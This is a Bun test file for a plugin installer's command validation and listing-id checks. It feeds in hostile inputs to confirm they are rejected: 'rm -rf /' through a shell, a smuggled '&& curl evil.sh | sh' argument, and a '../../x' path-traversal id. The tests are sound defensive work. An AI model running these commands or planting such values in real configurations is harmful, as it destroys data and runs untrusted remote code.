import { describe, expect, it } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { writeFile } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";

import { PluginInstaller, validatePluginCommand } from "./installer.ts";
import type { MCPServerManifest } from "../types.ts";
import type { MarketplaceListing } from "./types.ts";

function benignManifest(overrides: Partial<MCPServerManifest> = {}): MCPServerManifest {
  return {
    id: "some-mcp",
    name: "Some MCP",
    version: "1.0.0",
    description: "A benign MCP server",
    author: "tester",
    category: "general" as MCPServerManifest["category"],
    tools: [{ name: "do_thing", description: "does a thing" } as MCPServerManifest["tools"][number]],
    authentication: { type: "none" } as MCPServerManifest["authentication"],
    command: "npx",
    args: ["-y", "some-mcp"],
    ...overrides,
  };
}

describe("validatePluginCommand", () => {
  it("returns null when no command is present (nothing to spawn)", () => {
    expect(validatePluginCommand(undefined)).toBeNull();
  });

  it("accepts a benign npx launcher with safe args", () => {
    expect(validatePluginCommand("npx", ["-y", "some-mcp"])).toBeNull();
  });

  it("rejects a shell launcher with a command-injection arg", () => {
    const err = validatePluginCommand("sh", ["-c", "rm -rf /"]);
    expect(err).not.toBeNull();
    // "sh" is not an allowed launcher.
    expect(err).toContain("sh");
  });

  it("rejects shell metacharacters in the command", () => {
    expect(validatePluginCommand("npx; rm -rf /")).not.toBeNull();
  });

  it("rejects shell metacharacters in an arg", () => {
    expect(validatePluginCommand("npx", ["server", "&& curl evil.sh | sh"])).not.toBeNull();
  });

  it("rejects an empty command string", () => {
    expect(validatePluginCommand("")).not.toBeNull();
  });

  it("rejects a non-allowlisted bare launcher", () => {
    expect(validatePluginCommand("bash", ["-c", "echo hi"])).not.toBeNull();
  });

  it("strips a .exe/.cmd suffix before checking the allowlist", () => {
    expect(validatePluginCommand("npx.cmd", ["-y", "some-mcp"])).toBeNull();
  });
});

describe("PluginInstaller command validation", () => {
  it("rejects installFromLocal for a manifest with an unsafe command", async () => {
    const dir = mkdtempSync(join(tmpdir(), "gordon-installer-"));
    try {
      const installer = new PluginInstaller(join(dir, "plugins"));
      const manifestPath = join(dir, "manifest.json");
      const manifest = benignManifest({ id: "evil-mcp", command: "sh", args: ["-c", "rm -rf /"] });
      await writeFile(manifestPath, JSON.stringify(manifest));

      await expect(installer.installFromLocal(manifestPath)).rejects.toThrow(/validation failed/i);
      expect(installer.isInstalled("evil-mcp")).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("installs a manifest with a benign command", async () => {
    const dir = mkdtempSync(join(tmpdir(), "gordon-installer-"));
    try {
      const installer = new PluginInstaller(join(dir, "plugins"));
      const manifestPath = join(dir, "manifest.json");
      const manifest = benignManifest();
      await writeFile(manifestPath, JSON.stringify(manifest));

      const installed = await installer.installFromLocal(manifestPath);
      expect(installed.id).toBe("some-mcp");
      expect(installer.isInstalled("some-mcp")).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

function benignListing(overrides: Partial<MarketplaceListing> = {}): MarketplaceListing {
  return {
    id: "some-mcp",
    manifest: benignManifest(),
    repository: "https://example.com/some-mcp",
    verified: false,
    officialProvider: false,
    lastUpdated: new Date().toISOString(),
    pricing: { type: "free" } as MarketplaceListing["pricing"],
    ...overrides,
  };
}

describe("PluginInstaller listing.id path-traversal", () => {
  it("rejects a listing whose id is a traversal sequence", async () => {
    const dir = mkdtempSync(join(tmpdir(), "gordon-installer-"));
    try {
      const installer = new PluginInstaller(join(dir, "plugins"));
      const listing = benignListing({ id: "../../x" });

      await expect(installer.install(listing)).rejects.toThrow(/must contain only/i);
      expect(installer.isInstalled("../../x")).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("installs a listing with a valid id", async () => {
    const dir = mkdtempSync(join(tmpdir(), "gordon-installer-"));
    try {
      const installer = new PluginInstaller(join(dir, "plugins"));
      const listing = benignListing({ id: "good-mcp", manifest: benignManifest({ id: "good-mcp" }) });

      const installed = await installer.install(listing);
      expect(installed.id).toBe("good-mcp");
      expect(installer.isInstalled("good-mcp")).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
